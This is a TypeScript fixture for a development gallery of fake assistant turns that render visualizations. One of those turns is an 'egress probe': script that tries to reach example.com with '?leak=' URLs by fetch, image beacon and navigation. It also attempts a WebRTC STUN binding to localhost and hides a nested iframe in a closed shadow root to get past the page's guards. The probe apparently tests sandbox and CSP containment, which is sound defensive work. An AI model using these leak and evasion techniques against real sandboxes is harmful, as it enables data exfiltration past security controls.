/**
 * The thread gallery's Visualizations (development builds only): the package's examples, one
 * revised below, one still drawing, and a probe that tries to fetch and to navigate away.
 */
import { type SessionStreamItem, Sequence, TurnId, TurnItem } from "@polaris/protocol";
import { SessionStreamItem as StreamItem } from "@polaris/protocol";
import type { VisualizeInput } from "@polaris/visualization";
import { comparison, flowChart, loanCalculator, timeline } from "@polaris/visualization/examples";
import { turn } from "../thread/daemon.testing.ts";

/** Skips validation on purpose: the Daemon would refuse it; the frame must contain it anyway. */
const PROBE: VisualizeInput = {
  title: "Egress probe",
  html: String.raw`<div class="pv-stats">
  <div class="pv-stat"><div class="pv-stat-label">fetch</div><div class="pv-stat-value" id="fetch">…</div></div>
  <div class="pv-stat"><div class="pv-stat-label">image</div><div class="pv-stat-value" id="img">…</div></div>
  <div class="pv-stat"><div class="pv-stat-label">webrtc</div><div class="pv-stat-value" id="rtc">…</div></div>
</div>
<p id="csp" class="pv-caption">no CSP reports yet</p>
<p><button id="nav">Navigate away</button> <a href="https://example.com/docs?from=probe">Open the docs</a></p>
<script>
  const show = (id, text) => { document.getElementById(id).textContent = text; };
  const blocked = [];
  document.addEventListener("securitypolicyviolation", (event) => {
    blocked.push(event.violatedDirective + " " + event.blockedURI);
    show("csp", "CSP blocked: " + blocked.join(", "));
  });
  fetch("https://example.com/?leak=1")
    .then((response) => show("fetch", "reached " + response.status))
    .catch(() => show("fetch", "blocked"));
  const image = new Image();
  image.onload = () => show("img", "reached");
  image.onerror = () => show("img", "blocked");
  image.src = "https://example.com/favicon.ico?leak=1";
  // Tries a STUN binding to the host's local listener (scripts in /tmp during ENG-599's check).
  const stun = (w) => {
    if (typeof w.RTCPeerConnection !== "function") return "removed";
    const peer = new w.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:3478" }] });
    peer.createDataChannel("x");
    peer.createOffer().then((offer) => peer.setLocalDescription(offer));
    return "available";
  };
  show("rtc", stun(window));
  window.pvShadowReport = (text) => show("shadow", text);
</script>
<script>
  document.getElementById("nav").addEventListener("click", () => { location.href = "https://example.com/?leak=2"; });
</script>`,
};

/** A frame nested in a closed shadow root, which the page's own guards can't reach. */
const NESTED: VisualizeInput = {
  title: "Nested-frame probe",
  html: String.raw`<script>window.pvShadowReport = (text) => { document.getElementById("shadow").textContent = text; };</script>
<p class="pv-caption">nested frame in a closed shadow root: <span id="shadow">none ran</span></p>
<div><template shadowrootmode="closed"><iframe srcdoc="<script>parent.pvShadowReport(typeof RTCPeerConnection === 'function' ? (function(){var p=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:3478'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)});return 'RTC available'})() : 'RTC removed')</script>"></iframe></template></div>`,
};

/** Counts taps into pv.state, so a relaunch shows whether the count was kept. */
const COUNTER: VisualizeInput = {
  title: "Saved counter",
  html: String.raw`<div class="pv-stat"><div class="pv-stat-label">taps kept in pv.state</div><div class="pv-stat-value" id="n">0</div></div>
<p><button id="add">Add one</button></p>
<script>
  let n = pv.state.get() ?? 0;
  const show = () => { document.getElementById("n").textContent = String(n); };
  show();
  document.getElementById("add").addEventListener("click", () => { n += 1; pv.state.set(n); show(); });
</script>`,
};

const visualize = (
  id: string,
  input: VisualizeInput,
  status: "running" | "completed" = "completed"
) =>
  TurnItem.cases.ToolCall.make({
    id,
    name: "mcp__polaris__visualize",
    kind: "mcp",
    mcp: { server: "polaris", tool: "visualize" },
    input,
    output:
      status === "running"
        ? null
        : [
            {
              type: "text",
              text: JSON.stringify({ id: `viz_${id}`, title: input.title, bytes: 1 }),
            },
          ],
    status,
  });

const reply = (id: string, text: string) => TurnItem.cases.AssistantMessage.make({ id, text });

const read = (id: string, path: string) =>
  TurnItem.cases.ToolCall.make({
    id,
    name: "Read",
    kind: "read",
    input: { file_path: path },
    output: null,
    status: "completed",
  });

const ALL_TURNS = () => [
  {
    turn: turn(0, { prompt: "What would the payments be at 6.5% versus 7%?" }),
    items: [
      read("r1", "/repo/docs/loans.md"),
      read("r2", "/repo/docs/rates.md"),
      visualize("counter", COUNTER),
      visualize("loan", loanCalculator),
      reply("a1", "Drag the rate: at 7% the payment rises by about $130 a month."),
    ],
  },
  {
    turn: turn(1, { prompt: "Compare the two plans, then show how the release flows." }),
    items: [
      visualize("cmp", comparison),
      visualize("flow", flowChart),
      reply("a2", "Here's the flow."),
      visualize("cmp2", { ...timeline, replaces: "viz_cmp" }),
    ],
  },
  {
    turn: turn(2, { prompt: "Try to reach the network from a visualization." }),
    items: [
      visualize("probe", PROBE),
      visualize("nested", NESTED),
      reply("a3", "Neither request should get out."),
    ],
  },
  {
    turn: turn(3, { prompt: "Draw the timeline again.", status: "working", endedAt: null }),
    items: [visualize("drawing", timeline, "running")],
  },
];

/** Where the thread ends: every Turn, or the loan, revised or probe Turn last on screen. */
export type VisualsScene = "all" | "loan" | "revised" | "probe";

const LAST: Readonly<Record<VisualsScene, number>> = { all: 4, loan: 1, revised: 2, probe: 3 };

let scene: VisualsScene = "all";

/** The gallery's launch argument picks the scene before the data is built. */
export const setVisualsScene = (next: VisualsScene) => {
  scene = next;
};

export const visualsTurns = () => ALL_TURNS().slice(0, LAST[scene]);

export const visualsLive = (): ReadonlyArray<SessionStreamItem> =>
  scene === "all" ? liveDrawing() : [];

const liveDrawing = (): ReadonlyArray<SessionStreamItem> => [
  StreamItem.cases.Synchronized.make({ sequence: Sequence.make(1) }),
  StreamItem.cases.ItemProgress.make({
    turnId: TurnId.make("t-3"),
    item: visualize("drawing", timeline, "running"),
    subagentId: null,
  }),
];
